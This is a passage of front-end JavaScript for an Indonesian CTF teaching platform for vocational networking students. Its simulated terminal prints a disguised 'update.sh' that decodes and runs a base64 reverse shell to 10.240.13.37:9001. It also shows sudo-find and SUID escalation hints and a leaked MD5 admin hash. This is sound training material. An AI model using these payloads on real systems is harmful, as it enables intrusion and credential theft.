const $=s=>document.querySelector(s),app=$('#app');
let token=sessionStorage.getItem('cyber_token');
let name=sessionStorage.getItem('cyber_name');
let adminToken=sessionStorage.getItem('cyber_admin_token');
let challenges=[];
let progress={solved:[],attempts:0};
let view='dashboard';
let selected=1;
let examModeActive=false;
let adminSubView='grades'; // grades, exam, materials, curriculum, accounts, alerts, supabase
let authSubTab='login'; // 'login' | 'register'
let activeCategoryFilter='all'; // all, Linux, Jaringan, Cyber, Hardware
let materiSearchQuery='';

const escapeHTML=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

function updateHeaderAuthUI(){
  const whoSpan=$('#who');
  const btnAuth=$('#btnHeaderAuth');
  const btnLogout=$('#logout');
  if(token && name){
    if(whoSpan) whoSpan.textContent=name;
    if(btnAuth) btnAuth.style.display='none';
    if(btnLogout){
      btnLogout.style.display='inline-flex';
      btnLogout.textContent='[KELUAR]';
      btnLogout.title='Keluar dari sesi akun siswa';
    }
  } else if(adminToken){
    if(whoSpan) whoSpan.textContent='Guru / Superadmin';
    if(btnAuth) btnAuth.style.display='none';
    if(btnLogout){
      btnLogout.style.display='inline-flex';
      btnLogout.textContent='[KELUAR ADMIN]';
      btnLogout.title='Keluar dari sesi Superadmin/Guru';
    }
  } else {
    if(whoSpan) whoSpan.textContent='Penyelidik';
    if(btnAuth) btnAuth.style.display='inline-flex';
    if(btnLogout) btnLogout.style.display='none';
  }
}

function performLogout(){
  stopAudio();
  sessionStorage.clear();
  localStorage.removeItem('cyber_token');
  localStorage.removeItem('cyber_name');
  localStorage.removeItem('cyber_admin_token');
  token=null;
  name=null;
  adminToken=null;
  progress={solved:[],attempts:0};
  
  const aTab=$('#binderTabAdmin');
  if(aTab) aTab.style.display='none';
  
  updateHeaderAuthUI();

  if(window.location.pathname.toLowerCase().startsWith('/superadmin') || window.location.hash.includes('superadmin')){
    window.location.href='/';
  } else {
    view='dashboard';
    window.location.hash='';
    render();
    refresh();
  }
}

async function api(url,method='GET',data){
  const authToken = url.includes('/admin/') ? (adminToken||token) : (token||adminToken);
  const r=await fetch(url,{
    method,
    headers:{
      'Content-Type':'application/json',
      Authorization: authToken ? `Bearer ${authToken}` : ''
    },
    body:data?JSON.stringify(data):undefined
  });
  if(r.status===401 || r.status===403){
    if(url.includes('/admin/')){
      sessionStorage.removeItem('cyber_admin_token');
      adminToken=null;
      view='superadminLogin';
      render();
    }
  }
  const j=await r.json().catch(()=>({}));
  if(!r.ok) throw Error(j.error||'Permintaan gagal diproses server');
  return j;
}

async function updateDbStatusPill(){
  try{
    const st=await fetch('/api/db-status').then(r=>r.json());
    const pill=$('#supabasePillStatus');
    if(pill && st.statusText){
      pill.textContent=st.statusText;
      if(st.connected){
        pill.style.color='#059669';
        pill.style.borderColor='#059669';
        pill.style.background='#ECFDF5';
      }else if(st.mode==='supabase'){
        pill.style.color='#D97706';
        pill.style.borderColor='#D97706';
        pill.style.background='#FFFBEB';
      }else{
        pill.style.color='var(--pensil)';
        pill.style.background='var(--kertas-karton)';
      }
    }
  }catch{}
}

async function refresh(){
  try{
    // Jika siswa sedang login, ambil materi & progres siswa
    if(token && name){
      const j=await api('/api/challenges');
      challenges=j.challenges;
      progress=j.progress;
      examModeActive=!!j.examMode;
      $('#who').textContent=name;
    } else if(adminToken){
      // Jika mode guru/admin, ambil daftar materi dari admin / publik
      const j=await api('/api/admin/materials').catch(()=>fetch('/api/public/challenges').then(r=>r.json()));
      if(j && Array.isArray(j.materials)) challenges=j.materials;
      else if(j && Array.isArray(j.challenges)) challenges=j.challenges;
      $('#who').textContent='Guru / Admin';
    } else {
      // Halaman publik saat belum login
      const pub=await fetch('/api/public/challenges').then(r=>r.json()).catch(()=>null);
      if(pub && Array.isArray(pub.challenges) && pub.challenges.length>0){
        challenges=pub.challenges;
      }
      $('#who').textContent='Penyelidik';
    }
    updateDbStatusPill();
    render();
  }catch(err){
    console.warn('Refresh telemetri warning:', err.message);
    try{
      const pub=await fetch('/api/public/challenges').then(r=>r.json()).catch(()=>null);
      if(pub && Array.isArray(pub.challenges) && pub.challenges.length>0){
        challenges=pub.challenges;
      }
    }catch{}
    updateDbStatusPill();
    render();
  }
}

function score(){
  return challenges.filter(c=>progress.solved.includes(c.id)).reduce((n,c)=>n+c.points,0);
}

/* ================= AUDIO NARRATION ENGINE ================= */
let audioChunks=[];
let audioIndex=0;
let isPlayingAudio=false;

function splitIntoChunks(text){
  const raw=text.match(/[^.!?\n]+[.!?\n]+|[^.!?\n]+$/g)||[text];
  const chunks=[];
  let buffer='';
  for(const part of raw){
    const trimmed=part.trim();
    if(!trimmed)continue;
    if((buffer+' '+trimmed).length<150){
      buffer=buffer?buffer+' '+trimmed:trimmed;
    }else{
      if(buffer)chunks.push(buffer);
      buffer=trimmed;
    }
  }
  if(buffer)chunks.push(buffer);
  return chunks.length?chunks:[text];
}

function stopAudio(){
  if('speechSynthesis' in window){
    speechSynthesis.cancel();
  }
  isPlayingAudio=false;
  audioChunks=[];
  audioIndex=0;
  updateTapeDeckUI(false,'Pita kaset siap diputar. Klik [▶ PUTAR PENJELASAN].');
}

function updateTapeDeckUI(isPlaying,statusText){
  const statusBar=$('#tapeStatusBar');
  const indicator=$('#tapeIndicator');
  const spindles=document.querySelectorAll('.reel-spindle');
  if(statusBar){
    statusBar.textContent=statusText;
    statusBar.classList.toggle('active',isPlaying);
  }
  if(indicator){
    indicator.classList.toggle('recording',isPlaying);
  }
  spindles.forEach(s=>s.classList.toggle('spinning',isPlaying));
}

function playNarration(text){
  if(!('speechSynthesis' in window)){
    alert('Browser tidak mendukung Web Speech API. Disarankan menggunakan Google Chrome atau Microsoft Edge.');
    return;
  }
  stopAudio();
  audioChunks=splitIntoChunks(text);
  audioIndex=0;
  isPlayingAudio=true;
  playCurrentChunk();
}

function playCurrentChunk(){
  if(!isPlayingAudio||audioIndex>=audioChunks.length){
    isPlayingAudio=false;
    updateTapeDeckUI(false,'✓ Pemutaran rekaman selesai.');
    return;
  }
  const chunk=audioChunks[audioIndex];
  updateTapeDeckUI(true,`▶ MEMUTAR PITA: Bagian ${audioIndex+1} dari ${audioChunks.length} • Narasi Lapangan`);
  const u=new SpeechSynthesisUtterance(chunk);
  u.lang='id-ID';
  const speed=Number($('#speedSelect')?.value||1);
  u.rate=speed;
  const voices=speechSynthesis.getVoices();
  const idVoice=voices.find(v=>v.lang.toLowerCase().replace('_','-').startsWith('id'));
  if(idVoice)u.voice=idVoice;

  u.onend=()=>{
    if(isPlayingAudio){
      audioIndex++;
      playCurrentChunk();
    }
  };
  u.onerror=(e)=>{
    console.warn('SpeechSynthesis error:',e);
    if(isPlayingAudio){
      audioIndex++;
      playCurrentChunk();
    }
  };
  speechSynthesis.speak(u);
}

function pauseResumeAudio(){
  if(!('speechSynthesis' in window))return;
  if(speechSynthesis.paused){
    speechSynthesis.resume();
    updateTapeDeckUI(true,`▶ MELANJUTKAN: Bagian ${audioIndex+1}/${audioChunks.length}`);
  }else if(speechSynthesis.speaking){
    speechSynthesis.pause();
    updateTapeDeckUI(false,'❚❚ PITA DIJEDA (PAUSED)');
  }
}

function renderTapeDeckWidget(){
  return `
    <div class="tape-deck-widget">
      <div class="tape-deck-header">
        <div class="tape-deck-title">
          <span class="tape-indicator" id="tapeIndicator"></span>
          <span>ANALOG AUDIO WIRETAP // MICROCASSETTE DECK</span>
        </div>
        <span class="meta-tag" style="background:#141310;border-color:#3D382F;color:var(--kertas)">44.1 kHz • VOX ID</span>
      </div>
      <div class="tape-deck-body">
        <div class="tape-reels">
          <span class="reel-spindle"></span>
          <span style="font-size:11px;letter-spacing:1px">TAPE-A</span>
          <span class="reel-spindle"></span>
        </div>
        <div class="tape-controls">
          <button class="btn-tape btn-tape-play" id="btnTapePlay" type="button">▶ PUTAR PENJELASAN</button>
          <button class="btn-tape" id="btnTapePause" type="button">❚❚ JEDA</button>
          <button class="btn-tape" id="btnTapeStop" type="button">■ STOP</button>
          <select class="tape-speed-select" id="speedSelect">
            <option value="0.8">0.8×</option>
            <option selected value="1.0">1.0×</option>
            <option value="1.2">1.2×</option>
          </select>
        </div>
      </div>
      <div class="tape-status-bar" id="tapeStatusBar">Pita kaset siap diputar. Klik [▶ PUTAR PENJELASAN].</div>
    </div>
  `;
}

function wireTapeDeck(text){
  $('#btnTapePlay')?.addEventListener('click',()=>playNarration(text));
  $('#btnTapePause')?.addEventListener('click',()=>pauseResumeAudio());
  $('#btnTapeStop')?.addEventListener('click',()=>stopAudio());
}

/* ================= SIMULATOR TERMINAL LINUX ================= */
const outputs={
  'help':'Perintah investigasi yang disimulasikan:\n- pwd, whoami, ip a, ls, ls -la, clear\n- cat config.txt\n- find / -perm -u=s -type f 2>/dev/null\n- ls -la /usr/local/bin\n- curl -i http://api.toko.lab/profile\n- decode <string_base64>\n- cat knock.log\n- cat cipher.hex\n- cat update.sh\n- cat uart_config.txt\n- sudo -l\n- cat leak.txt',
  'whoami':'student',
  'pwd':'/home/student',
  'ip a':'1: lo: <LOOPBACK,UP> mtu 65536 inet 127.0.0.1/8\n2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 inet 10.10.0.15/24',
  'ls':'cipher.hex  config.txt  knock.log  leak.txt  notes.txt  update.sh  uart_config.txt',
  'ls -la':'drwxr-xr-x 2 student student 4096 Nov 17 10:00 .\ndrwxr-xr-x 3 root    root    4096 Nov 17 09:30 ..\n-rw------- 1 student student   48 Nov 17 09:15 .secret\n-rw-r--r-- 1 student student  182 Nov 17 09:20 config.txt\n-rw-r--r-- 1 student student  142 Nov 17 09:40 cipher.hex\n-rw-r--r-- 1 student student  430 Nov 17 09:45 knock.log\n-rw-r--r-- 1 student student   88 Nov 17 09:50 leak.txt\n-rwxr-xr-x 1 student student  120 Nov 17 09:52 update.sh\n-rw-r--r-- 1 student student  310 Nov 17 09:55 uart_config.txt\n-rw-r--r-- 1 student student  210 Nov 17 09:58 notes.txt',
  'cat config.txt':'MODE=defensive\nAUDIT=enabled\nFIREWALL=active\nRATE_LIMIT=10/min\n# Parameter keamanan Linux Server TJKT',
  'find / -perm -u=s -type f 2>/dev/null':'/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/local/bin/backup-tool',
  'find / -perm -4000 2>/dev/null':'/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/local/bin/backup-tool',
  'ls -la /usr/local/bin':'total 24\ndrwxr-xr-x 2 root root 4096 Nov 17 09:00 .\ndrwxr-xr-x 10 root root 4096 Nov 17 08:30 ..\n-rwsr-xr-x 1 root root 14280 Nov 17 09:12 backup-tool',
  'curl -i http://api.toko.lab/profile':'HTTP/1.1 200 OK\nServer: Nginx/1.22.1 (Ubuntu)\nContent-Type: application/json\nSet-Cookie: session=eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJndWVzdCIsImFkbWluIjpmYWxzZX0=; Path=/; HttpOnly\n\n{"status":"success","message":"Profil pengguna terverifikasi"}',
  'decode Q1RG':'Hasil Decode Base64:\nCTF',
  'decode eyJ1c2VyIjoic3R1ZGVudCIsInJvbGUiOiJndWVzdCIsImFkbWluIjpmYWxzZX0=':'Hasil Decode Base64:\n{"user":"student","role":"guest","admin":false}',
  'cat knock.log':'Nov 17 10:00:01 firewall-srv kernel: [IPTABLES DROP] IN=eth0 SRC=10.10.0.5 DST=10.10.0.1 PROTO=TCP DPT=7005 [CLOSED]\nNov 17 10:00:02 firewall-srv kernel: [IPTABLES DROP] IN=eth0 SRC=10.10.0.5 DST=10.10.0.1 PROTO=TCP DPT=8042 [CLOSED]\nNov 17 10:00:03 firewall-srv kernel: [IPTABLES DROP] IN=eth0 SRC=10.10.0.5 DST=10.10.0.1 PROTO=TCP DPT=9110 [CLOSED]\nNov 17 10:00:04 firewall-srv knockd[420]: 10.10.0.5: sequence matched: OPENING SSH PORT 22\nNov 17 10:00:04 firewall-srv sshd[425]: Accepted publickey for student from 10.10.0.5 port 54321 ssh2 [OPEN - SSH ESTABLISHED]',
  'cat cipher.hex':'--- [DUMP MALWARE ENCRYPTED BUFFER] ---\nOffset 0000: 0x15 0x1f 0x12 0x14 0x76 0x33 0x37 0x21\nCatatan Analisis Statis: Plaintext diawali dengan string "FLAG"\n(Karakter \'F\' = 0x46 ASCII. Kunci = Plaintext XOR Ciphertext = 0x46 ^ 0x15)',
  'cat update.sh':'#!/bin/bash\n# Scheduled System Diagnostics Task\necho "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMjQwLjEzLjM3LzkwMDEgMD4mMQ==" | base64 -d | bash',
  'decode c2ggLWkgPiYgL2Rldi90Y3AvMTAuMjQwLjEzLjM3LzkwMDEgMD4mMQ==':'Hasil Decode Base64:\nsh -i >& /dev/tcp/10.240.13.37/9001 0>&1',
  'cat uart_config.txt':'=== [HARDWARE RECONNAISSANCE: ROUTER PCB UART INTERFACE] ===\nHeader J3: 4-Pin Header (1: VCC 3.3V, 2: TX, 3: RX, 4: GND)\nSoC: MediaTek MT7621AT (MIPS 1004Kc Dual-Core)\nOsilator Crystal: 40.000 MHz\nMode Serial: 8 Data Bits, No Parity, 1 Stop Bit (8N1)\nDefault Console Baud Rate: 115200 bps (Standard Linux Embedded Kernel Console)',
  'sudo -l':'Matching Defaults entries for student on cyberlab:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/bin\n\nUser student may run the following commands on cyberlab:\n    (ALL : ALL) NOPASSWD: /usr/bin/find',
  'cat leak.txt':'# Database Dump - tbl_administrators\nid: 1\nusername: admin\nemail: security-admin@lab.corp\npassword_hash: 5f4dcc3b5aa765d61d8327deb882cf99  (MD5 no-salt)'
};

function executeTerminalCommand(cmd, inputEl, historyEl, termEl){
  const val=cmd.trim();
  if(!val)return;
  if(val==='clear'){
    historyEl.textContent='';
  }else if(val.startsWith('decode ')){
    const raw=val.slice(7).trim();
    try{
      const decoded=atob(raw);
      historyEl.textContent+=`pemain@lab:~$ ${val}\nHasil Decode Base64:\n${decoded}\n\n`;
    }catch(err){
      historyEl.textContent+=`pemain@lab:~$ ${val}\n[Error] String bukan format Base64 yang valid.\n\n`;
    }
  }else{
    const normalized=val.replace(/\s+/g,' ');
    const out=outputs[val]||outputs[normalized];
    historyEl.textContent+=`pemain@lab:~$ ${val}\n${out||'bash: '+val+': perintah tidak dikenali dalam simulasi. Ketik help untuk daftar perintah yang sah.'}\n\n`;
  }
  inputEl.value='';
  termEl.scrollTop=termEl.scrollHeight;
}

function initTerminal(elementId='term', historyId='history', inputId='cmd'){
  const inputEl=$('#'+inputId), historyEl=$('#'+historyId), termEl=$('#'+elementId);
  if(!inputEl||!historyEl||!termEl)return;
  inputEl.focus();
  inputEl.onkeydown=e=>{
    if(e.key==='Enter'){
      executeTerminalCommand(inputEl.value, inputEl, historyEl, termEl);
    }
  };

  document.querySelectorAll('[data-cmd]').forEach(pill=>{
    pill.onclick=()=>{
      const command=pill.dataset.cmd;
      inputEl.value=command;
      executeTerminalCommand(command, inputEl, historyEl, termEl);
    };
  });
}

/* ================= ROUTING & RENDERING ================= */
function render(){
  document.querySelectorAll('.binder-tab').forEach(b=>b.classList.toggle('active',b.dataset.view===view));
  
  const titles={
    dashboard:'Sampul & Indeks Kasus',
    auth:'Identifikasi Berkas Operasi Siswa',
    superadminLogin:'Gerbang Otorisasi Komando Superadmin',
    tujuan:'Tujuan Pembelajaran & Silabus TJKT',
    materi:'Berkas Materi & Analisis Lapangan',
    tantangan:'Meja Kasus (CTF Workbench)',
    terminal:'Konsol Terminal Lapangan',
    peringkat:'Roster Buku Besar (Leaderboard)',
    admin:'Panel Guru & Penilaian TJKT'
  };
  const breadcrumbs={
    dashboard:'BERKAS INVESTIGASI SIBER • EDISI 2026',
    auth:'AUTENTIKASI & REGISTRASI MANDIRI SISWA // LAB TJKT',
    superadminLogin:'PORTAL KHUSUS GURU & ADMINISTRATOR // SUPERADMIN',
    tujuan:'SILABUS KURIKULUM MERDEKA • TEKNIK JARINGAN KOMPUTER & TELEKOMUNIKASI',
    materi:'PEDOMAN TEKNIS & PROSEDUR INVESTIGASI',
    tantangan:'MEJA OPERASI KHUSUS & REKAYASA EKSPLOITASI',
    terminal:'SUBSISTEM TERMINAL LINUX MANDIRI',
    peringkat:'CATATAN BUKU BESAR REPUTASI OPERATOR',
    admin:'PORTAL KHUSUS GURU & MANAJEMEN PENILAIAN SISWA'
  };

  $('#pageTitle').textContent=titles[view]||'Investigasi Lapangan';
  $('#canvasBreadcrumb').textContent=breadcrumbs[view]||'BERKAS RESMI';

  updateHeaderAuthUI();

  if(view==='dashboard')dashboard();
  if(view==='auth')authView();
  if(view==='superadminLogin')superadminLoginView();
  if(view==='tujuan')tujuan();
  if(view==='materi')materi();
  if(view==='tantangan')tantangan();
  if(view==='terminal')terminal();
  if(view==='peringkat')peringkat();
  if(view==='admin')admin();
}

/* ================= VIEW: AUTENTIKASI SISWA (MASUK & REGISTRASI INTEGRATED - NO POPUP) ================= */
function authView(){
  app.innerHTML = `
    <div class="dossier-card dossier-card-white login-dossier-card login-form-container" style="border:2.5px solid var(--tinta-pekat);max-width:520px;margin:24px auto;box-shadow:8px 8px 0 var(--tinta-pekat);padding:32px 28px;box-sizing:border-box">
      <div class="tape-strip"></div>
      <div class="dossier-stamp-top">BERKAS IDENTIFIKASI OPERATOR // SISWA</div>
      
      <!-- Tab Pilihan: Masuk vs Registrasi Mandiri -->
      <div class="auth-tabs" style="margin-top:16px">
        <button type="button" class="auth-tab-btn ${authSubTab==='login'?'active':''}" id="authTabLogin">🔑 Masuk Akun Siswa</button>
        <button type="button" class="auth-tab-btn ${authSubTab==='register'?'active':''}" id="authTabRegister">📝 Registrasi Mandiri</button>
      </div>

      <!-- Form 1: Masuk Akun Siswa -->
      <div id="authLoginSection" style="display:${authSubTab==='login'?'block':'none'}">
        <div class="login-header-group" style="margin-top:10px">
          <div class="login-serial">REF: AUTH-TJKT-2026/LOGIN</div>
          <h2 style="font-family:var(--font-judul);font-size:24px;margin:8px 0;color:var(--tinta-pekat)">Masuk Buku Catatan Siswa</h2>
          <p class="login-desc" style="font-size:13px;color:var(--tinta-tubuh);line-height:1.55;margin-bottom:18px">
            Masukkan identitas siswa dan PIN/kata sandi Anda untuk menyinkronkan riwayat praktikum lab dan penilaian rapor kompetensi.
          </p>
        </div>

        <form id="inlineLoginForm" style="margin-top:14px">
          <div class="login-field-wrap">
            <label for="inpStudentName" class="login-label">NAMA SISWA / PENGGUNA:</label>
            <input id="inpStudentName" placeholder="contoh: Ahmad_Fauzi" required minlength="2" maxlength="40" autocomplete="nickname">
          </div>

          <div class="login-field-wrap" style="margin-top:12px">
            <label for="inpStudentPassword" class="login-label">KATA SANDI / PIN KEAMANAN:</label>
            <input id="inpStudentPassword" type="password" placeholder="Masukkan kata sandi/PIN Anda" required minlength="4" maxlength="40" autocomplete="current-password">
          </div>

          <button type="submit" class="btn-primary-action login-submit" style="margin-top:18px">
            <span>Masuk & Lanjutkan Lab Siswa →</span>
          </button>
          <p class="login-error" id="inlineLoginError"></p>
          
          <div style="margin-top:16px;padding-top:12px;border-top:1px dashed var(--garis-buku);text-align:center;font-size:12px">
            Belum memiliki akun siswa? 
            <a href="#" id="linkGoRegister" style="color:var(--merah-stempel);font-weight:700;text-decoration:underline">Daftar Mandiri di sini</a>
          </div>
        </form>
      </div>

      <!-- Form 2: Registrasi Mandiri Siswa Baru -->
      <div id="authRegisterSection" style="display:${authSubTab==='register'?'block':'none'}">
        <div class="login-header-group" style="margin-top:10px">
          <div class="login-serial">REF: REG-TJKT-2026/NEW</div>
          <h2 style="font-family:var(--font-judul);font-size:24px;margin:8px 0;color:var(--tinta-pekat)">Registrasi Akun Siswa Baru</h2>
          <p class="login-desc" style="font-size:13px;color:var(--tinta-tubuh);line-height:1.55;margin-bottom:18px">
            Daftarkan akun siswa Anda secara mandiri untuk memulai pembelajaran lab keamanan siber dan pencatatan perolehan skor XP.
          </p>
        </div>

        <form id="inlineRegisterForm" style="margin-top:14px">
          <div class="login-field-wrap">
            <label for="inpRegStudentName" class="login-label">NAMA LENGKAP SISWA:</label>
            <input id="inpRegStudentName" placeholder="contoh: Ahmad_Fauzi" required minlength="2" maxlength="40">
          </div>

          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px">
            <div class="login-field-wrap" style="margin-bottom:0">
              <label for="inpRegStudentKelas" class="login-label">KELAS:</label>
              <input id="inpRegStudentKelas" placeholder="contoh: XII TJKT 1" value="XII TJKT 1" required maxlength="30">
            </div>
            <div class="login-field-wrap" style="margin-bottom:0">
              <label for="inpRegStudentNisn" class="login-label">NISN (OPSIONAL):</label>
              <input id="inpRegStudentNisn" placeholder="Nomor Induk Siswa" maxlength="20">
            </div>
          </div>

          <div class="login-field-wrap" style="margin-top:12px">
            <label for="inpRegStudentPassword" class="login-label">BUAT KATA SANDI / PIN (MIN 4 KARAKTER):</label>
            <input id="inpRegStudentPassword" type="password" placeholder="Buat kata sandi akun Anda" required minlength="4" maxlength="40" autocomplete="new-password">
          </div>

          <button type="submit" class="btn-primary-action login-submit" style="margin-top:18px">
            <span>Daftar Akun & Mulai Belajar →</span>
          </button>
          <p class="login-error" id="inlineRegisterError"></p>
          
          <div style="margin-top:16px;padding-top:12px;border-top:1px dashed var(--garis-buku);text-align:center;font-size:12px">
            Sudah memiliki akun terdaftar? 
            <a href="#" id="linkGoLogin" style="color:var(--merah-stempel);font-weight:700;text-decoration:underline">Masuk di sini</a>
          </div>
        </form>
      </div>

      <div style="margin-top:18px;text-align:center">
        <button type="button" class="btn-secondary-action" id="btnCancelAuth" style="font-size:12px">← Kembali ke Sampul Kasus (Dashboard)</button>
      </div>
    </div>
  `;

  $('#authTabLogin').onclick = () => { authSubTab = 'login'; authView(); };
  $('#authTabRegister').onclick = () => { authSubTab = 'register'; authView(); };
  $('#linkGoRegister').onclick = (e) => { e.preventDefault(); authSubTab = 'register'; authView(); };
  $('#linkGoLogin').onclick = (e) => { e.preventDefault(); authSubTab = 'login'; authView(); };
  $('#btnCancelAuth').onclick = () => { view = 'dashboard'; render(); };

  $('#inlineLoginForm').onsubmit = async (e) => {
    e.preventDefault();
    const errSlot = $('#inlineLoginError');
    errSlot.textContent = '';
    try {
      const sName = $('#inpStudentName').value.trim();
      const sPass = $('#inpStudentPassword').value;
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: sName, password: sPass })
      });
      const data = await res.json();
      if (!res.ok) {
        if (res.status === 404) {
          authSubTab = 'register';
          authView();
          $('#inpRegStudentName').value = sName;
          $('#inlineRegisterError').textContent = data.error;
          return;
        }
        throw Error(data.error || 'Gagal masuk akun');
      }
      token = data.token;
      name = data.name;
      sessionStorage.setItem('cyber_token', token);
      sessionStorage.setItem('cyber_name', name);
      if (data.concurrentWarning) {
        alert(data.concurrentWarning);
      }
      view = 'dashboard';
      updateHeaderAuthUI();
      await refresh();
    } catch (err) {
      errSlot.textContent = err.message;
    }
  };

  $('#inlineRegisterForm').onsubmit = async (e) => {
    e.preventDefault();
    const errSlot = $('#inlineRegisterError');
    errSlot.textContent = '';
    try {
      const sName = $('#inpRegStudentName').value.trim();
      const sKelas = $('#inpRegStudentKelas').value.trim();
      const sNisn = $('#inpRegStudentNisn')?.value.trim() || '';
      const sPass = $('#inpRegStudentPassword').value;

      const res = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: sName, password: sPass, kelas: sKelas, nisn: sNisn })
      });
      const data = await res.json();
      if (!res.ok) throw Error(data.error || 'Gagal mendaftar akun');

      token = data.token;
      name = data.name;
      sessionStorage.setItem('cyber_token', token);
      sessionStorage.setItem('cyber_name', name);
      alert(`✓ Registrasi berhasil! Selamat datang di CyberLab CTF, ${name}.`);
      view = 'dashboard';
      updateHeaderAuthUI();
      await refresh();
    } catch (err) {
      errSlot.textContent = err.message;
    }
  };
}

/* ================= VIEW: OTORISASI GURU & SUPERADMIN (/superadmin - NO POPUP) ================= */
function superadminLoginView(){
  app.innerHTML = `
    <div class="dossier-card dossier-card-white login-dossier-card login-form-container" style="border:2.5px solid var(--tinta-pekat);max-width:480px;margin:24px auto;box-shadow:8px 8px 0 var(--tinta-pekat);padding:32px 28px;box-sizing:border-box">
      <div class="tape-strip"></div>
      <div class="dossier-stamp-top" style="color:var(--merah-stempel)">OTORISASI KOMANDO // SUPERADMIN</div>
      
      <div class="login-header-group" style="margin-top:14px">
        <div class="login-serial">PORTAL KHUSUS GURU & ADMINISTRATOR // SMK TJKT</div>
        <h2 style="font-family:var(--font-judul);font-size:24px;margin:8px 0;color:var(--tinta-pekat)">Gerbang Panel Superadmin</h2>
        <p class="login-desc" style="font-size:13px;color:var(--tinta-tubuh);line-height:1.55;margin-bottom:18px">
          Akses area khusus instruktur dan pengawas. Masukkan kata sandi administrator untuk mengelola kurikulum HOTS, monitoring sesi siswa ganda, dan evaluasi hasil belajar.
        </p>
      </div>

      <form id="inlineSuperadminForm" style="margin-top:14px">
        <div class="login-field-wrap">
          <label for="inpSuperAdminPassword" class="login-label">KATA SANDI ADMINISTRATOR / GURU:</label>
          <input id="inpSuperAdminPassword" type="password" placeholder="Masukkan kata sandi superadmin..." required autocomplete="current-password" autofocus>
        </div>

        <button type="submit" class="btn-primary-action login-submit" style="margin-top:18px">
          <span>Buka Portal Superadmin →</span>
        </button>
        <p class="login-error" id="superAdminLoginError"></p>
        
        <div style="margin-top:18px;padding-top:14px;border-top:1px dashed var(--garis-buku);text-align:center">
          <button type="button" class="btn-secondary-action" id="btnBackToHome" style="font-size:12px">← Kembali ke Halaman Utama Siswa</button>
        </div>
      </form>
    </div>
  `;

  $('#btnBackToHome').onclick = () => {
    if(window.location.pathname.toLowerCase().startsWith('/superadmin') || window.location.hash.includes('superadmin')){
      window.location.href='/';
    } else {
      view = 'dashboard';
      window.location.hash = '';
      render();
    }
  };

  $('#inlineSuperadminForm').onsubmit = async (e) => {
    e.preventDefault();
    const errSlot = $('#superAdminLoginError');
    errSlot.textContent = '';
    try {
      const pass = $('#inpSuperAdminPassword').value;
      const res = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: pass })
      });
      const data = await res.json();
      if (!res.ok) throw Error(data.error || 'Kata sandi salah!');

      adminToken = data.token;
      sessionStorage.setItem('cyber_admin_token', adminToken);
      const adminTab = $('#binderTabAdmin');
      if (adminTab) adminTab.style.display = 'inline-flex';
      view = 'admin';
      adminSubView = 'grades';
      admin();
    } catch (err) {
      errSlot.textContent = err.message;
    }
  };
}

/* ================= 1. DASHBOARD ================= */
function dashboard(){
  const solvedCount=progress.solved.length;
  const totalCount=challenges.length||60;
  const pct=Math.round(100*solvedCount/totalCount);

  app.innerHTML=`
    <div class="dossier-card dossier-card-white" style="border:2px solid var(--tinta-pekat)">
      <div class="tape-strip"></div>
      
      <div style="display:grid;grid-template-columns:1.2fr 0.8fr;gap:28px;align-items:center;flex-wrap:wrap">
        <div>
          <span class="meta-tag" style="background:var(--merah-stempel-bg);color:var(--merah-stempel);border-color:var(--merah-stempel)">
            MEDIA BELAJAR KEJURUAN TJKT // VOL. 03
          </span>
          <h2 style="font-family:var(--font-judul);font-size:32px;font-weight:900;margin:12px 0 14px;line-height:1.15">
            Cara Membobol Sesuatu yang <span class="stabilo-pen">Kamu Pahami.</span>
          </h2>
          <p style="font-size:15px;color:var(--tinta-tubuh);margin:0 0 20px;line-height:1.65">
            Platform Capture The Flag (CTF) interaktif ini dirancang khusus untuk siswa <strong>Teknik Jaringan Komputer dan Telekomunikasi (TJKT)</strong>. Berisi ${totalCount} studi kasus berjenjang dari tingkat <strong>Dasar (Low)</strong>, <strong>Menengah (Medium)</strong>, hingga <strong>Tinggi (High)</strong> yang tersimpan di database dan dilengkapi simulator terminal Linux nyata.
          </p>
          <div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap">
            <button class="btn-primary-action" id="btnStartCase" type="button" style="font-size:13px;padding:12px 20px">
              <span>Buka Kasus Pertama (#001) →</span>
            </button>
            <button class="btn-secondary-action" id="btnGoSyllabus" type="button" style="font-size:13px">
              <span>Baca Tujuan & Silabus TJKT 📖</span>
            </button>
          </div>
        </div>

        <div style="background:var(--layar-tabung);border:2px solid var(--tinta-pekat);box-shadow:var(--bayangan-tegas);padding:18px;color:var(--fosfor);font-family:var(--font-kode);font-size:12px;border-radius:var(--radius)">
          <div style="color:var(--pensil-pudar);border-bottom:1px solid rgba(101,232,76,0.2);padding-bottom:6px;margin-bottom:8px">// REKAMAN TELEMETRI SASARAN:</div>
          <pre style="margin:0;white-space:pre-wrap;font-family:inherit">$ sudo -l
Matching Defaults entries for student:
    secure_path=/usr/local/sbin:/usr/bin
User student may run the following:
    (ALL : ALL) NOPASSWD: /usr/bin/find ◄─ "titik eskalasi"</pre>
          <div class="marginalia-note" style="margin-top:10px;font-size:18px">
            ✎ "Belajar keamanan siber bukan menghafal exploit, tapi memahami logika di balik konfigurasi sistem."
          </div>
        </div>
      </div>
    </div>

    <!-- Statistik Ledger -->
    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:18px;margin-bottom:28px">
      <div class="dossier-card" style="padding:18px">
        <span style="font-family:var(--font-kode);font-size:10px;color:var(--pensil);letter-spacing:1px">REPUTASI TERKUMPUL</span>
        <strong style="display:block;font-family:var(--font-judul);font-size:32px;color:var(--tinta-pekat);margin:4px 0">${score()} XP</strong>
        <span class="meta-tag">TOTAL BOUNTY KASUS TJKT</span>
      </div>
      <div class="dossier-card" style="padding:18px">
